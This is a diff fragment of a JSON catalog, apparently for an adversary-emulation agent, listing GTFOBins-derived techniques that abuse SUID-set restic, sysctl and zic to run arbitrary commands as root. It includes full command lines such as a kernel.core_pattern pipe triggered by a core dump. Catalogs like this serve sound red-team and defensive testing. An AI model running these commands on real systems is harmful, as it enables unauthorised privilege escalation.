+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "blind": true
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:restic:command:1:suid::",
+        "source_name": "restic",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `restic` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:restic:command:0:suid::",
+      "name": "GTFOBINS - T1059 - restic - Command - Suid [b115df4]",
+      "description": "This executable can run non-interactive system commands. Binary: restic. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/restic",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/restic",
+        "source_bin": "restic",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "blind": true
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:restic:command:0:suid::",
+        "source_name": "restic",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `restic` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:sysctl:command:0:suid::",
+      "name": "GTFOBINS - T1059 - sysctl - Command - Suid [5ae0e3f]",
+      "description": "This executable can run non-interactive system commands. Binary: sysctl. Context: SUID. The command is executed by `root` in the background when a core dump occurs. To trigger a core dump, send the `SIGQUIT` signal to a process, for example: ``` sleep infinity & kill -QUIT $! ```",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "sysctl 'kernel.core_pattern=|/path/to/command'",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/sysctl",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/sysctl",
+        "source_bin": "sysctl",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "blind": true
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:sysctl:command:0:suid::",
+        "source_name": "sysctl",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `sysctl` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:zic:command:0:suid::",
+      "name": "GTFOBINS - T1059 - zic - Command - Suid [b5dcc02]",
+      "description": "This executable can run non-interactive system commands. Binary: zic. Context: SUID. This executes the command twice: - `/path/to/command 0 xxx` - `/path/to/command 1 xxx` Additionally the `Test` file is created.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >#{lotl_gtfobins_local_path}\necho 'Zone Test 2:00 Jordan CE%sT' >>#{lotl_gtfobins_local_path}\nzic -d . -y /path/to/command #{lotl_gtfobins_local_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/zic",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/zic",
+        "source_bin": "zic",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:zic:command:0:suid::",
+        "source_name": "zic",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `zic` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    }
+  ],
+  "chains": []
+}
